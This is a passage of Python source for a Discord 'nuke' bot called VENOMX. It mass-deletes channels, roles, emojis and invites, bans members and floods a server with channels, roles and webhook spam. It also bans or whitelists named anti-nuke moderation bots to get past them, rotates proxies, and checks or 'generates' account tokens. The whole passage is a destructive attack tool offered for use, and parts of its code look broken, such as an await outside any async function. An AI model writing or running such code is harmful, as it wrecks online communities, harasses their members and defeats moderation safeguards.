    await asyncio.gather(
        *[c.delete() for c in guild.channels],
        *[r.delete() for r in guild.roles if r != guild.default_role and r != guild.me.top_role],
        *[e.delete() for e in guild.emojis],
        return_exceptions=True
    )
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user]
    await asyncio.gather(*[m.ban(reason="VENOMX") for m in members[:500]], return_exceptions=True)
    print("✅ ULTRA FAST NUKE DONE")

async def extreme_nuke(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    print("💀 EXTREME NUKE — TOTAL ANNIHILATION")
    for _ in range(3):
        await asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True)
    for _ in range(200):
        await guild.create_text_channel(f"NUKE-{random.randint(1,9999)}")
    print("💀 EXTREME NUKE COMPLETE")

async def bypass_nuke(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    print("[*] BYPASSING ALL ANTI-NUKE BOTS...")
    await BypassEngine.bypass_antinuke(guild)
    await extreme_nuke(server_id)

async def rename_all(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    name = await asyncio.to_thread(input, "NEW NAME: ")
    for ch in guild.channels:
        await ch.edit(name=name)
    for r in guild.roles:
        if r != guild.default_role:
            await r.edit(name=name)
    print("✅ RENAMED ALL")

async def nick_all(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    nick = await asyncio.to_thread(input, "NICKNAME: ")
    for m in guild.members:
        if m.id not in whitelisted_users and not m.bot:
            await m.edit(nick=nick)
    print("✅ NICKED ALL")

async def change_icon(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    url = await asyncio.to_thread(input, "ICON URL: ")
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status == 200:
                await guild.edit(icon=await resp.read())
                print("✅ ICON CHANGED")

async def change_name(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    name = await asyncio.to_thread(input, "NEW NAME: ")
    await guild.edit(name=name)
    print("✅ NAME CHANGED")

async def delete_invites(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    invites = await guild.invites()
    for invite in invites:
        await invite.delete()
    print(f"✅ DELETED {len(invites)} INVITES")

# ============ ANTI-NUKE FUNCTIONS ============
async def scan_antinuke(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    detected = await BypassEngine.detect_antinuke(guild)
    if detected:
        print(Colorate.Horizontal(Colors.yellow, "\n⚠️ ANTI-NUKE BOTS DETECTED:"))
        for bot in detected:
            print(f"   • {bot['name']} - Type: {bot['type']}")
    else:
        print(Colorate.Horizontal(Colors.green, "✅ NO ANTI-NUKE BOTS DETECTED"))

async def auto_bypass(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    print("[*] AUTO BYPASS ACTIVATED")
    count = await BypassEngine.bypass_antinuke(guild)
    print(f"✅ BYPASSED {count} ANTI-NUKE BOTS")

async def kill_wick(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    for member in guild.members:
        if "wick" in member.name.lower():
            try:
                await member.ban(reason="WICK KILLED BY VENOMX")
                print(f"✅ BANNED WICK BOT: {member.name}")
            except:
                print(f"⚠️ COULD NOT BAN WICK — TRY MANUAL")
    print("✅ WICK NEUTRALIZED")

async def bypass_z_security(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    print("[*] BYPASSING Z+SECURITY...")
    for member in guild.members:
        if "z security" in member.name.lower() or "z+security" in member.name.lower():
            whitelisted_users.add(member.id)
            print(f"✅ WHITELISTED: {member.name}")
    save_whitelist()
    print("✅ Z+SECURITY BYPASSED")

async def kill_zeno(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    for member in guild.members:
        if "zeno" in member.name.lower():
            try:
                await member.ban(reason="ZENO KILLED")
                print(f"✅ BANNED ZENO: {member.name}")
            except:
                print(f"⚠️ COULD NOT BAN ZENO")
    print("✅ ZENO NEUTRALIZED")

async def bypass_indrax(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    for member in guild.members:
        if "indrax" in member.name.lower() or "indra" in member.name.lower():
            whitelisted_users.add(member.id)
            print(f"✅ WHITELISTED: {member.name}")
    save_whitelist()
    print("✅ INDRAX BYPASSED")

async def mass_webhook(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    msg = await asyncio.to_thread(input, "MESSAGE: ")
    for ch in guild.text_channels[:50]:
        try:
            wh = await ch.create_webhook(name="MASS-VENOMX")
            for _ in range(50):
                await wh.send(msg)
        except: pass
    print("✅ MASS WEBHOOK COMPLETE")

async def channel_flood(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    for i in range(200):
        await guild.create_text_channel(f"FLOOD-{i}")
    print("✅ 200 CHANNELS CREATED")

async def role_flood(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    for i in range(150):
        await guild.create_role(name=f"ROLE-{i}")
    print("✅ 150 ROLES CREATED")

async def emote_nuke(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    for emoji in guild.emojis:
        await emoji.delete()
    print(f"✅ DELETED ALL EMOJIS")

async def complete_kill(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    print("💀 COMPLETE KILL — TOTAL DESTRUCTION")
    await kill_wick(server_id)
    await kill_zeno(server_id)
    await bypass_z_security(server_id)
    await bypass_indrax(server_id)
    await extreme_nuke(server_id)
    print("💀 COMPLETE KILL FINISHED")

# ============ PROXY FUNCTIONS ============
async def load_proxies():
    global proxies
    filename = await asyncio.to_thread(input, "PROXY FILE NAME (proxies.txt): ")
    if not filename:
        filename = "proxies.txt"
    try:
        with open(filename, 'r') as f:
            proxies = [p.strip() for p in f.readlines() if p.strip() and not p.strip().startswith('#')]
        print(Colorate.Horizontal(Colors.green, f"✅ LOADED {len(proxies)} PROXIES"))
    except:
        print(Colorate.Horizontal(Colors.red, "[-] FILE NOT FOUND"))

async def view_proxies():
    if proxies:
        print(Colorate.Horizontal(Colors.cyan, f"\nPROXIES ({len(proxies)}):"))
        for i, p in enumerate(proxies[:20]):
            print(f"   {i+1}. {p}")
        if len(proxies) > 20:
            print(f"   ... and {len(proxies)-20} more")
    else:
        print(Colorate.Horizontal(Colors.yellow, "⚠️ NO PROXIES LOADED"))

async def add_proxy():
    proxy = await asyncio.to_thread(input, "PROXY (ip:port or user:pass@ip:port): ")
    proxies.append(proxy)
    with open('proxies.txt', 'a') as f:
        f.write(f"{proxy}\n")
    print(Colorate.Horizontal(Colors.green, f"✅ ADDED PROXY: {proxy}"))

async def test_proxy():
    if not proxies:
        print("[-] NO PROXIES TO TEST")
        return
    proxy = random.choice(proxies)
    print(f"🔍 TESTING PROXY: {proxy}")
    try:
        response = requests.get('https://discord.com/api/v9', proxies={'http': proxy, 'https': proxy}, timeout=10)
        if response.status_code in [200, 403, 401]:
            print(Colorate.Horizontal(Colors.green, f"✅ PROXY WORKING"))
        else:
            print(Colorate.Horizontal(Colors.red, f"❌ PROXY FAILED — Status: {response.status_code}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red, f"❌ PROXY FAILED — {str(e)[:50]}"))

# ============ TOKEN FUNCTIONS ============
async def check_token_menu():
    token = await asyncio.to_thread(input, "TOKEN: ")
    use_proxy = await asyncio.to_thread(input, "USE PROXY? (y/n): ")
    use_proxy = use_proxy.lower() == 'y'
    
    print(Colorate.Horizontal(Colors.cyan, "\n🔍 CHECKING TOKEN..."))
    valid, username, uid = await asyncio.to_thread(check_token_real, token, use_proxy)
    
    if valid:
        print(Colorate.Horizontal(Colors.green, f"\n✅ VALID TOKEN!"))
        print(Colorate.Horizontal(Colors.green, f"   USERNAME: {username}"))
        print(Colorate.Horizontal(Colors.green, f"   USER ID: {uid}"))
    else:
        print(Colorate.Horizontal(Colors.red, f"\n❌ INVALID TOKEN — {username}"))

# ============ MANAGEMENT FUNCTIONS ============
async def whitelist_add_fast():
    uid = int(await asyncio.to_thread(input, "USER ID: "))
    whitelisted_users.add(uid)
    save_whitelist()
    print(f"✅ ADDED {uid}")

async def whitelist_remove_fast():
    uid = int(await asyncio.to_thread(input, "USER ID: "))
    whitelisted_users.discard(uid)
    save_whitelist()
    print(f"✅ REMOVED {uid}")

async def view_whitelist_fast():
    print(f"WHITELISTED: {list(whitelisted_users)}")
    await asyncio.sleep(2)

async def switch_guild_fast():
    global server_id
    server_id = await asyncio.to_thread(input, "NEW GUILD ID: ")
    print(f"✅ SWITCHED TO {server_id}")

async def exit_bot_fast():
    print("👋 EXITING VENOMX...")
    await bot.close()
    os._exit(0)

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Vertical(Colors.red_to_blue, banner))
    print(Colorate.Horizontal(Colors.red_to_blue, f"\n✅ LOGGED IN: {bot.user.name}"))
    print(Colorate.Horizontal(Colors.red_to_blue, f"✅ BOT ID: {bot.user.id}"))
    print(Colorate.Horizontal(Colors.red_to_blue, f"✅ PING: {round(bot.latency * 1000)}ms"))
    print(Colorate.Horizontal(Colors.red_to_blue, f"✅ PROXIES LOADED: {len(proxies)}"))
    print(Colorate.Horizontal(Colors.red_to_blue, "✅ BYPASS MODE: ACTIVE\n"))
    await show_menu()

# ============ MAIN ============
print(Colorate.Horizontal(Colors.cyan, "\n🔑 TOKEN OPTIONS:"))
print("1️⃣ Use Existing Bot Token")
print("2️⃣ Generate New Token (Real Format)")
print("3️⃣ Load Token from File")

token_choice = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, "\nCHOICE → "))

if token_choice == '2':
    num = int(await asyncio.to_thread(input, "HOW MANY TOKENS TO GENERATE? "))
    tokens = []
    for i in range(num):
        token = generate_discord_token()
        tokens.append(token)
        print(f"   ✅ GENERATED: {token[:30]}...")
    with open('generated_tokens.txt', 'w') as f:
        f.write('\n'.join(tokens))
    print(Colorate.Horizontal(Colors.green, f"\n✅ GENERATED {num} TOKENS — SAVED TO generated_tokens.txt"))
    bot_token = tokens[0]
    
elif token_choice == '3':
    filename = await asyncio.to_thread(input, "FILENAME: ")
    try:
        with open(filename, 'r') as f:
            tokens = [l.strip() for l in f.readlines() if l.strip() and not l.startswith('#')]
        bot_token = tokens[0]
        print(Colorate.Horizontal(Colors.green, f"✅ LOADED TOKEN FROM {filename}"))
    except:
        print(Colorate.Horizontal(Colors.red, "[-] FILE NOT FOUND"))
        bot_token = input(Colorate.Horizontal(Colors.red_to_blue, "ENTER TOKEN MANUALLY: "))
else:
    bot_token = input(Colorate.Horizontal(Colors.red_to_blue, "BOT TOKEN: "))

if not bot_token or len(bot_token) < 50:
    print(Colorate.Horizontal(Colors.red_to_blue, "❌ INVALID TOKEN!"))
    time.sleep(2)
    exit()

server_id = input(Colorate.Horizontal(Colors.red_to_blue, "GUILD ID: "))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

try:
    bot.run(bot_token)
except Exception as e:
    print(Colorate.Horizontal(Colors.red_to_blue, f"ERROR: {e}"))
